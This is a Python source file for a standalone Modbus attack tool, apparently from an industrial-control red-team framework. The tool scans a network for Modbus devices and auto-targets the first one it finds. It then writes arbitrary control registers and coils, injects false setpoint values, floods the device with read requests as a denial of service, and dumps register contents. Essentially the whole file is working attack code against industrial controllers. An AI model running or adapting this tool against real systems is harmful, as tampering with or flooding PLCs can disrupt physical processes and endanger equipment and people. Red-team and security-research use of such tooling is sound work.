#!/usr/bin/env python3
"""
Standalone Modbus Attack Tool

A direct Modbus attack implementation that runs from a red team box on the same network
as the target, without requiring metasploit, SSH, or watering hole attack infrastructure.

This tool wraps the existing ModbusAttack functionality to run attacks directly using the
ModbusClient without the WateringHoleAttack dependencies.

Usage:
    python3 standalone_modbus_attack.py --target <IP> --attack <attack_type>

Attack Types:
    - command_injection: Execute command injection attack sequence
    - dos: Execute denial of service attack
    - false_data: Execute false data injection attack
    - exfiltration: Execute information exfiltration attack
    - all: Execute all attack types sequentially
    - discover: Discover Modbus devices on the network

Examples:
    python3 standalone_modbus_attack.py --target 192.168.1.100 --attack command_injection
    python3 standalone_modbus_attack.py --discover --attack dos  # Discover then attack first device
    python3 standalone_modbus_attack.py --target 10.0.0.50 --attack all
    python3 standalone_modbus_attack.py --discover-only  # Just discover devices
"""

# --- FORCE LOGGING SETUP AT TOP ---
import logging
import sys

print("StandaloneModbusAttack: script started (print test)")
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)s - %(message)s", "%Y-%m-%d %H:%M:%S")
)
if not root_logger.hasHandlers():
    root_logger.addHandler(handler)
else:
    # Remove all handlers and add ours
    for h in root_logger.handlers[:]:
        root_logger.removeHandler(h)
    root_logger.addHandler(handler)
# --- END LOGGING SETUP ---

import argparse
import logging
import random
import sys
import time
from typing import Optional, List, Dict, Any

from controller.modbus.ModbusAttack import ModbusConstants, ModbusDataPoint
from controller.modbus.modbus_client import ModbusClient

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger(__name__)


class StandaloneModbusAttack:
    """
    Standalone Modbus attack implementation that wraps the existing ModbusAttack
    functionality without requiring metasploit or watering hole infrastructure.
    """

    def __init__(
        self,
        target_host: Optional[str] = None,
        target_port: int = 502,
        unit_id: int = 1,
        use_discovery: bool = False,
    ):
        """
        Initialize the standalone Modbus attack.

        Args:
            target_host: Target Modbus device IP address (optional if using discovery)
            target_port: Target Modbus port (default 502)
            unit_id: Modbus unit ID (default 1)
            use_discovery: Whether to use device discovery
        """
        self.target_host = target_host
        self.target_port = target_port
        self.unit_id = unit_id
        self.use_discovery = use_discovery
        self.discovered_devices: List[Dict[str, Any]] = []

        if target_host:
            self.client = ModbusClient(
                host=target_host, port=target_port, unit_id=unit_id
            )
            logger.info(
                f"Initialized Modbus attack against {target_host}:{target_port} (Unit ID: {unit_id})"
            )
        else:
            # Initialize client without target for discovery mode
            self.client = ModbusClient(port=target_port, unit_id=unit_id)
            logger.info("Initialized Modbus attack in discovery mode")

    def discover_devices(
        self,
        timeout: float = 10.0,
        scan_network: bool = True,
        network_range: str = "192.168.1.0/24",
    ) -> List[Dict[str, Any]]:
        """
        Discover Modbus devices on the network.

        Args:
            timeout: Discovery timeout in seconds

        Returns:
            List of discovered devices
        """
        logger.info("Starting comprehensive Modbus device discovery...")
        devices = self.client.discover_devices(
            timeout=timeout, scan_network=scan_network, network_range=network_range
        )
        self.discovered_devices = devices

        if devices:
            logger.info(f"Discovered {len(devices)} Modbus devices:")
            for i, device in enumerate(devices, 1):
                logger.info(
                    f"  {i}. {device['ip']} - {device.get('vendor', 'Unknown')} {device.get('model', '')}"
                )
        else:
            logger.warning("No Modbus devices discovered")

        return devices

    def auto_target_first_device(self) -> bool:
        """
        Automatically target the first discovered device.

        Returns:
            True if successfully targeted a device, False otherwise
        """
        if not self.discovered_devices:
            logger.error("No discovered devices available")
            return False

        device = self.discovered_devices[0]
        self.target_host = device["ip"]
        self.client.host = device["ip"]

        logger.info(f"Auto-targeting device: {device['ip']}")
        return True

    def _execute_modbus_command(
        self,
        action: str,
        address: int,
        number: int,
        data_registers: Optional[str] = None,
    ) -> Optional[str]:
        """
        Execute a Modbus command using the client directly.

        Args:
            action: Modbus action (READ_COILS, READ_REGISTERS, WRITE_REGISTERS, etc.)
            address: Starting address
            number: Number of items
            data_registers: Comma-separated data for write operations

        Returns:
            Response string or None if failed
        """
        try:
            # Ensure we have a target
            if not self.target_host and self.use_discovery:
                if not self.discovered_devices:
                    self.discover_devices()
                if not self.auto_target_first_device():
                    return None

            response = self.client.send_command(
                action, address, number, data_registers or ""
            )

            logger.info(f"Modbus command {action} response: {response}")
            return response
        except Exception as e:
            logger.error(f"Modbus command {action} failed: {str(e)}")
            return None

    def _execute_modbus_sequence(
        self,
        action: str,
        address: int,
        number: int,
        data_registers: Optional[str] = None,
        sequence_name: str = "",
    ) -> Optional[str]:
        """Execute a Modbus command sequence with logging."""
        logger.info(f"Executing {sequence_name}: {action} at address {address}")
        response = self._execute_modbus_command(action, address, number, data_registers)
        logger.info(f"{sequence_name} response: {response}")
        return response

    def command_injection_attack(self) -> None:
        """Execute command injection attack sequence."""
        logger.info("Starting command injection attack")
        try:
            # Initial control sequence
            self._execute_modbus_sequence(
                action="WRITE_MULTIPLE_REGISTERS",
                address=2000,
                number=3,
                data_registers="1,1,0",
                sequence_name="Initial control",
            )

            # Retry sequence
            for i in range(ModbusConstants.MAX_RETRIES):
                self._execute_modbus_sequence(
                    action="WRITE_MULTIPLE_REGISTERS",
                    address=3000,
                    number=5,
                    data_registers="1,0,1,0,1",
                    sequence_name=f"Retry sequence {i+1}",
                )
                time.sleep(ModbusConstants.RETRY_DELAY)

            # Verification sequence
            self._execute_modbus_sequence(
                action="READ_REGISTERS",
                address=2000,
                number=3,
                sequence_name="Status verification",
            )

            logger.info("Command injection attack completed successfully")

        except Exception as e:
            logger.error(f"Command injection attack failed: {str(e)}")
            raise

    def denial_of_service_attack(self) -> None:
        """Execute DoS attack sequence."""
        logger.info("Starting denial of service attack")
        try:
            # Register flood
            logger.info("Starting register flood")
            for i in range(ModbusConstants.FLOOD_ITERATIONS):
                try:
                    self._execute_modbus_command(
                        action="READ_REGISTERS",
                        address=0,
                        number=ModbusConstants.MAX_REGISTERS,
                    )
                    if i % 50 == 0:
                        logger.info(
                            f"Register flood iteration {i+1}/{ModbusConstants.FLOOD_ITERATIONS}"
                        )
                except Exception as e:
                    logger.error(f"Register flood error at {i+1}: {str(e)}")

            # Coil flood
            logger.info("Starting coil flood")
            for i in range(ModbusConstants.FLOOD_ITERATIONS):
                try:
                    self._execute_modbus_command(
                        action="READ_COILS", address=0, number=ModbusConstants.MAX_COILS
                    )
                    if i % 50 == 0:
                        logger.info(
                            f"Coil flood iteration {i+1}/{ModbusConstants.FLOOD_ITERATIONS}"
                        )
                except Exception as e:
                    logger.error(f"Coil flood error at {i+1}: {str(e)}")

            # Check target status
            self._execute_modbus_sequence(
                action="READ_REGISTERS",
                address=ModbusConstants.STATUS_ADDRESS,
                number=1,
                sequence_name="Status check",
            )

            logger.info("Denial of service attack completed")

        except Exception as e:
            logger.error(f"DoS attack failed: {str(e)}")
            raise

    def false_data_injection_attack(self) -> None:
        """Execute false data injection attack sequence."""
        logger.info("Starting false data injection attack")
        try:
            # Write control values
            self._execute_modbus_sequence(
                action="WRITE_MULTIPLE_REGISTERS",
                address=ModbusConstants.CONTROL_ADDRESS,
                number=5,
                data_registers="13000,12800,12500,12200,12000",
                sequence_name="Control values injection",
            )

            # Write coil states
            self._execute_modbus_sequence(
                action="WRITE_MULTIPLE_COILS",
                address=ModbusConstants.CONTROL_ADDRESS + 100,
                number=3,
                data_registers="1,0,1",
                sequence_name="Coil states injection",
            )

            logger.info("False data injection attack completed successfully")

        except Exception as e:
            logger.error(f"False data injection attack failed: {str(e)}")
            raise

    def information_exfiltration_attack(self) -> None:
        """Execute information exfiltration attack sequence."""
        logger.info("Starting information exfiltration attack")
        try:
            data_points = [
                ModbusDataPoint(
                    address=1000,
                    count=10,
                    description="Holding Registers",
                    is_input=False,
                ),
                ModbusDataPoint(
                    address=2000, count=16, description="Input Registers", is_input=True
                ),
                ModbusDataPoint(
                    address=3000, count=32, description="Coil Status", is_input=False
                ),
            ]

            exfiltrated_data = {}
            random.shuffle(data_points)

            for point in data_points:
                # Determine the correct action based on data type
                if point.description == "Coil Status":
                    action = "READ_COILS"
                elif point.is_input:
                    action = "READ_INPUT_REGISTERS"
                else:
                    action = "READ_REGISTERS"

                result = self._execute_modbus_sequence(
                    action=action,
                    address=point.address,
                    number=point.count,
                    sequence_name=f"Exfiltrating {point.description}",
                )

                if result:
                    exfiltrated_data[point.description] = {
                        "address": point.address,
                        "values": result,
                    }

                time.sleep(
                    random.uniform(ModbusConstants.MIN_DELAY, ModbusConstants.MAX_DELAY)
                )

            logger.info("\n=== Exfiltrated Data Summary ===")
            for desc, data in exfiltrated_data.items():
                logger.info(f"\n{desc}:")
                logger.info(f"Address Range: {data['address']}")
                logger.info(f"Values: {data['values']}")

            logger.info("Information exfiltration attack completed successfully")

        except Exception as e:
            logger.error(f"Information exfiltration failed: {str(e)}")
            raise

    def run_all_attacks(self) -> None:
        """Execute all attack types sequentially."""
        logger.info("Starting all Modbus attacks")

        attacks = [
            ("Command Injection", self.command_injection_attack),
            ("False Data Injection", self.false_data_injection_attack),
            ("Information Exfiltration", self.information_exfiltration_attack),
            (
                "Denial of Service",
                self.denial_of_service_attack,
            ),  # DoS last as it may disrupt
        ]

        for attack_name, attack_method in attacks:
            try:
                logger.info(f"\n{'='*50}")
                logger.info(f"Executing {attack_name} Attack")
                logger.info(f"{'='*50}")
                attack_method()
                logger.info(f"{attack_name} attack completed successfully")
                time.sleep(2)  # Brief pause between attacks
            except Exception as e:
                logger.error(f"{attack_name} attack failed: {str(e)}")
                continue

        logger.info("\nAll Modbus attacks completed")


def main() -> None:
    """Main entry point for the standalone Modbus attack tool."""
    parser = argparse.ArgumentParser(
        description="Standalone Modbus Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target 192.168.1.100 --attack command_injection
  %(prog)s --target broadcast --attack dos --port 502
  %(prog)s --target 10.0.0.50 --attack all --unit-id 2
        """,
    )

    parser.add_argument(
        "--target",
        help="Target Modbus device IP address (optional if using --discover)",
    )

    parser.add_argument(
        "--port", type=int, default=502, help="Target Modbus port (default: 502)"
    )

    parser.add_argument(
        "--unit-id", type=int, default=1, help="Modbus unit/slave ID (default: 1)"
    )

    parser.add_argument(
        "--attack",
        choices=["command_injection", "dos", "false_data", "exfiltration", "all"],
        help="Type of attack to execute",
    )

    parser.add_argument(
        "--discover",
        action="store_true",
        help="Discover devices before attacking (uses first discovered device)",
    )

    parser.add_argument(
        "--discover-only",
        action="store_true",
        help="Only discover devices, don't execute attacks",
    )

    parser.add_argument(
        "--discovery-timeout",
        type=float,
        default=10.0,
        help="Discovery timeout in seconds (default: 10.0)",
    )

    parser.add_argument(
        "--no-scan",
        action="store_true",
        help="Disable TCP port scanning (UDP broadcast only)",
    )

    parser.add_argument(
        "--network-range",
        type=str,
        default="192.168.1.0/24",
        help="Network range to scan in CIDR notation (default: 192.168.1.0/24)",
    )

    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Enable verbose logging"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Validate arguments
    if not args.discover_only and not args.attack:
        parser.error("--attack is required unless using --discover-only")

    if not args.target and not args.discover and not args.discover_only:
        parser.error("Either --target or --discover/--discover-only must be specified")

    try:
        # Initialize the attack
        use_discovery = args.discover or args.discover_only
        attack = StandaloneModbusAttack(
            args.target, args.port, args.unit_id, use_discovery=use_discovery
        )

        # Handle discovery-only mode
        if args.discover_only:
            devices = attack.discover_devices(
                timeout=args.discovery_timeout,
                scan_network=not args.no_scan,
                network_range=args.network_range,
            )
            if devices:
                logger.info(f"\n=== Discovered {len(devices)} Modbus devices ===")
                for i, device in enumerate(devices, 1):
                    logger.info(f"{i}. {device['ip']}")
                    logger.info(f"   Vendor: {device.get('vendor', 'Unknown')}")
                    logger.info(f"   Model: {device.get('model', 'Unknown')}")
                    logger.info(f"   Raw Response: {device.get('raw_hex', 'N/A')}")
            sys.exit(0)

        # Handle discovery + attack mode
        if args.discover:
            devices = attack.discover_devices(
                timeout=args.discovery_timeout,
                scan_network=not args.no_scan,
                network_range=args.network_range,
            )
            if not devices:
                logger.error("No devices discovered, cannot proceed with attacks")
                sys.exit(1)
            attack.auto_target_first_device()

        # Execute the specified attack
        if args.attack == "command_injection":
            attack.command_injection_attack()
        elif args.attack == "dos":
            attack.denial_of_service_attack()
        elif args.attack == "false_data":
            attack.false_data_injection_attack()
        elif args.attack == "exfiltration":
            attack.information_exfiltration_attack()
        elif args.attack == "all":
            attack.run_all_attacks()

        logger.info("Attack execution completed successfully")

    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
